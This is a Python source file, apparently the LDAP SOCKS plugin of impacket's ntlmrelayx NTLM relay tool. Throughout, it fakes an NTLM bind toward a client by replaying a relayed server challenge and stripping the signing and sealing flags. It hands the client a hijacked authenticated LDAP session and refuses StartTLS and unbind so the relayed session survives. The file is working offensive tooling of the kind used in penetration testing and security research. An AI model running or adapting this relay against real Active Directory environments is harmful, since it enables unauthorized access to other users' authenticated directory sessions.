import select
from pyasn1.codec.ber import encoder, decoder
from pyasn1.error import SubstrateUnderrunError
from pyasn1.type import univ

from impacket import LOG, ntlm
from impacket.examples.ntlmrelayx.servers.socksserver import SocksRelay
from impacket.ldap.ldap import LDAPSessionError
from impacket.ldap.ldapasn1 import KNOWN_NOTIFICATIONS, LDAPDN, NOTIFICATION_DISCONNECT, BindRequest, BindResponse, SearchRequest, SearchResultEntry, SearchResultDone, LDAPMessage, LDAPString, ResultCode, PartialAttributeList, PartialAttribute, AttributeValue, UnbindRequest, ExtendedRequest
from impacket.ntlm import NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_SEAL

PLUGIN_CLASS = 'LDAPSocksRelay'

class LDAPSocksRelay(SocksRelay):
    PLUGIN_NAME = 'LDAP Socks Plugin'
    PLUGIN_SCHEME = 'LDAP'

    MSG_SIZE = 4096

    def __init__(self, targetHost, targetPort, socksSocket, activeRelays):
        SocksRelay.__init__(self, targetHost, targetPort, socksSocket, activeRelays)

    @staticmethod
    def getProtocolPort():
        return 389

    def initConnection(self):
        # No particular action required to initiate the connection
        pass

    def skipAuthentication(self):
        # Faking an NTLM authentication with the client
        while True:
            messages = self.recv_ldap_msg()
            if messages is None:
                LOG.warning('LDAP: Client did not send ldap messages or closed connection')
                return False
            LOG.debug(f'LDAP: Received {len(messages)} message(s)')

            for message in messages:
                msg_component = message['protocolOp'].getComponent()
                if msg_component.isSameTypeWith(BindRequest):
                    # BindRequest received

                    if msg_component['authentication'] == univ.OctetString(''):
                        # First bind message without authentication
                        # Replying with a request for NTLM authentication

                        LOG.debug('LDAP: Got empty bind request')

                        bindresponse = BindResponse()
                        bindresponse['resultCode'] = ResultCode('success')
                        bindresponse['matchedDN'] = LDAPDN('NTLM')
                        bindresponse['diagnosticMessage'] = LDAPString('')
                        self.send_ldap_msg(bindresponse, message['messageID'])

                        # Let's receive next messages
                        continue

                    elif 'sicilyNegotiate' in msg_component['authentication']:
                        # Requested NTLM authentication

                        LOG.debug('LDAP: Got NTLM bind request')

                        # Load negotiate message
                        negotiateMessage = ntlm.NTLMAuthNegotiate()
                        negotiateMessage.fromString(msg_component['authentication']['sicilyNegotiate'].asOctets())

                        # Reuse the challenge message from the real authentication with the server
                        challengeMessage = self.sessionData['CHALLENGE_MESSAGE']
                        # We still remove the annoying flags
                        challengeMessage['flags'] &= ~(NTLMSSP_NEGOTIATE_SIGN)
                        challengeMessage['flags'] &= ~(NTLMSSP_NEGOTIATE_SEAL)

                        # Building the LDAP bind response message
                        bindresponse = BindResponse()
                        bindresponse['resultCode'] = ResultCode('success')
                        bindresponse['matchedDN'] = LDAPDN(challengeMessage.getData())
                        bindresponse['diagnosticMessage'] = LDAPString('')

                        # Sending the response
                        self.send_ldap_msg(bindresponse, message['messageID'])

                    elif 'sicilyResponse' in msg_component['authentication']:
                        # Received an NTLM auth bind request

                        # Parsing authentication method
                        chall_response = ntlm.NTLMAuthChallengeResponse()
                        chall_response.fromString(msg_component['authentication']['sicilyResponse'].asOctets())

                        username = chall_response['user_name'].decode('utf-16le')
                        domain = chall_response['domain_name'].decode('utf-16le')
                        self.username = f'{domain}/{username}'

                        # Checking for the two formats the domain can have (taken from both HTTP and SMB socks plugins)
                        if f'{domain}/{username}'.upper() in self.activeRelays:
                            self.username = f'{domain}/{username}'.upper()
                        elif f'{domain.split(".", 1)[0]}/{username}'.upper() in self.activeRelays:
                            self.username = f'{domain.split(".", 1)[0]}/{username}'.upper()
                        else:
                            # Username not in active relays
                            LOG.error('LDAP: No session for %s@%s(%s) available' % (
                                username, self.targetHost, self.targetPort))
                            return False

                        if self.activeRelays[self.username]['inUse'] is True:
                            LOG.error('LDAP: Connection for %s@%s(%s) is being used at the moment!' % (
                                self.username, self.targetHost, self.targetPort))
                            return False
                        else:
                            LOG.info('LDAP: Proxying client session for %s@%s(%s)' % (
                                self.username, self.targetHost, self.targetPort))
                            self.activeRelays[self.username]['inUse'] = True
                            self.session = self.activeRelays[self.username]['protocolClient'].session.socket
                        
                        # Building successful LDAP bind response
                        bindresponse = BindResponse()
                        bindresponse['resultCode'] = ResultCode('success')
                        bindresponse['matchedDN'] = LDAPDN('')
                        bindresponse['diagnosticMessage'] = LDAPString('')

                        # Sending successful response
                        self.send_ldap_msg(bindresponse, message['messageID'])

                        return True
                    else:
                        LOG.error('LDAP: Received an unknown LDAP binding request, cannot continue')
                        return False

                else:
                    msg_component = message['protocolOp'].getComponent()
                    if msg_component.isSameTypeWith(SearchRequest):
                        # Pre-auth search request

                        if msg_component['attributes'][0] == LDAPString('supportedCapabilities'):
                            # supportedCapabilities
                            response = SearchResultEntry()
                            response['objectName'] = LDAPDN('')
                            response['attributes'] = PartialAttributeList()

                            attribs = PartialAttribute()
                            attribs.setComponentByName('type', 'supportedCapabilities')
                            attribs.setComponentByName('vals', univ.SetOf(componentType=AttributeValue()))
                            # LDAP_CAP_ACTIVE_DIRECTORY_OID
                            attribs.getComponentByName('vals').setComponentByPosition(0, AttributeValue('1.2.840.113556.1.4.800'))
                            # LDAP_CAP_ACTIVE_DIRECTORY_V51_OID
                            attribs.getComponentByName('vals').setComponentByPosition(1, AttributeValue('1.2.840.113556.1.4.1670'))
                            # LDAP_CAP_ACTIVE_DIRECTORY_LDAP_INTEG_OID
                            attribs.getComponentByName('vals').setComponentByPosition(2, AttributeValue('1.2.840.113556.1.4.1791'))
                            # ISO assigned OIDs
                            attribs.getComponentByName('vals').setComponentByPosition(3, AttributeValue('1.2.840.113556.1.4.1935'))
                            attribs.getComponentByName('vals').setComponentByPosition(4, AttributeValue('1.2.840.113556.1.4.2080'))
                            attribs.getComponentByName('vals').setComponentByPosition(5, AttributeValue('1.2.840.113556.1.4.2237'))

                            response['attributes'].append(attribs)

                        elif msg_component['attributes'][0] == LDAPString('supportedSASLMechanisms'):
                            # supportedSASLMechanisms
                            response = SearchResultEntry()
                            response['objectName'] = LDAPDN('')
                            response['attributes'] = PartialAttributeList()

                            attribs = PartialAttribute()
                            attribs.setComponentByName('type', 'supportedSASLMechanisms')
                            attribs.setComponentByName('vals', univ.SetOf(componentType=AttributeValue()))
                            # Force NTLMSSP to avoid parsing every type of authentication
                            attribs.getComponentByName('vals').setComponentByPosition(0, AttributeValue('NTLM'))

                            response['attributes'].append(attribs)
                        else:
                            # Any other message triggers the closing of client connection
                            return False

                        # Sending message
                        self.send_ldap_msg(response, message['messageID'])
                        # Sending searchResDone
                        result_done = SearchResultDone()
                        result_done['resultCode'] = ResultCode('success')
                        result_done['matchedDN'] = LDAPDN('')
                        result_done['diagnosticMessage'] = LDAPString('')
                        self.send_ldap_msg(result_done, message['messageID'])

    def recv_ldap_msg(self):
        '''Receive LDAP messages during the SOCKS client LDAP authentication.'''

        data = b''
        done = False
        while not done:
            recvData = self.socksSocket.recv(self.MSG_SIZE)
            if recvData == b'':
                # Connection got closed
                return None
            if len(recvData) < self.MSG_SIZE:
                done = True
            data += recvData

        response = []
        while len(data) > 0:
            try:
                message, remaining = decoder.decode(data, asn1Spec=LDAPMessage())
            except SubstrateUnderrunError:
                # We need more data
                new_data = self.socksSocket.recv(self.MSG_SIZE)
                if new_data == b'':
                    # Connection got closed
                    return None
                remaining = data + new_data
            else:
                response.append(message)
            data = remaining

        return response
    
    def send_ldap_msg(self, response, message_id, controls=None):
        '''Send LDAP messages during the SOCKS client LDAP authentication.'''

        message = LDAPMessage()
        message['messageID'] = message_id
        message['protocolOp'].setComponentByType(response.getTagSet(), response)
        if controls is not None:
            message['controls'].setComponents(*controls)

        data = encoder.encode(message)

        return self.socksSocket.sendall(data)

    def wait_for_data(self, socket1, socket2):
        return select.select([socket1, socket2], [], [])[0]

    def passthrough_sockets(self, client_sock, server_sock):
        while True:
            rready = self.wait_for_data(client_sock, server_sock)

            for sock in rready:

                if sock == client_sock:
                    # Data received from client
                    try:
                        read = client_sock.recv(self.MSG_SIZE)
                    except Exception:
                        read = ''
                    if not read:
                        return

                    if not self.is_allowed_request(read):
                        # Stop client connection when unallowed requests are made
                        return

                    if not self.is_forwardable_request(read):
                        # Do not forward unbind requests, otherwise we would loose the SOCKS
                        continue

                    try:
                        server_sock.send(read)
                    except Exception:
                        raise BrokenPipeError('Broken pipe: LDAP server is gone')

                elif sock == server_sock:
                    # Data received from server
                    try:
                        read = server_sock.recv(self.MSG_SIZE)
                    except Exception:
                        read = ''
                    if not read:
                        raise BrokenPipeError('Broken pipe: LDAP server is gone')

                    try:
                        client_sock.send(read)
                    except Exception:
                        return

    def tunnelConnection(self):
        '''Charged of tunneling the rest of the connection.'''

        self.passthrough_sockets(self.socksSocket, self.session)
        
        # Free the relay so that it can be reused
        self.activeRelays[self.username]['inUse'] = False

        LOG.debug('LDAP: Finished tunnelling')

        return True

    def is_forwardable_request(self, data):
        try:
            message, remaining = decoder.decode(data, asn1Spec=LDAPMessage())
            msg_component = message['protocolOp'].getComponent()

            # Search for unbind requests
            if msg_component.isSameTypeWith(UnbindRequest):
                LOG.warning('LDAP: Client tried to unbind LDAP connection, skipping message')
                return False
        except Exception:
            # Is probably not an unbind LDAP message
            pass

        return True

    def is_allowed_request(self, data):
        try:
            message, remaining = decoder.decode(data, asn1Spec=LDAPMessage())
            msg_component = message['protocolOp'].getComponent()

            # Search for START_TLS LDAP extendedReq OID
            if msg_component.isSameTypeWith(ExtendedRequest) and msg_component['requestName'].asOctets() == b'1.3.6.1.4.1.1466.20037':
                # 1.3.6.1.4.1.1466.20037 is LDAP_START_TLS_OID
                LOG.warning('LDAP: Client tried to initiate Start TLS, closing connection')
                return False
        except Exception:
            # Is probably not a ExtendedReq message
            pass

        return True
